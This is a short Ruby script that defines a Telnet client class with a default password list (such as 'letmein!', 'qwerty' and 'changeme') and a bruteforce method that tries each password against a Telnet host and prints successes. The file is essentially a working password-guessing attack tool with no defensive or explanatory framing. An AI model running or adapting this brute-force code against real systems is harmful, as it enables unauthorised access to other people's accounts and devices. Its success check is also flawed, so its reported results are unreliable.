#!/usr/bin/env ruby

require 'net/telnet'

class TelnetClient
	attr_accessor :user, :pass, :host
	attr_accessor :target, :good
	attr_accessor :passlist

	def initialize(opts={})
		@user = opts[:user] || "testuser"
		@pass = opts[:pass] || "testpass"
		@host = opts[:host] || "localhost"
		@passlist = opts[:passlist] || %w{test password1 letmein! test123 qwerty monkey changeme}
		unless @passlist.kind_of? Array
			raise ArgumentError, "Passlist needs to be an Array"
		end
	end

	def connect
		@target.close rescue nil
		puts "Trying %s:%s@%s" % [@user, @pass, @host]
		@target = Net::Telnet::new( "Host" => @host, "Timeout" => 3)
		begin
			@target.login(@user, @pass)
			@good = true
		rescue
			@good = false
		end
	end

	def bruteforce
		tries = 0
		max = @passlist.size
		puts "Trying #{max} passwords..."
		@passlist.each do |pw|
			@pass = pw
			puts "*** Success: #{@user}:#{@pass}" if connect
			tries += 1
		end
	end

end
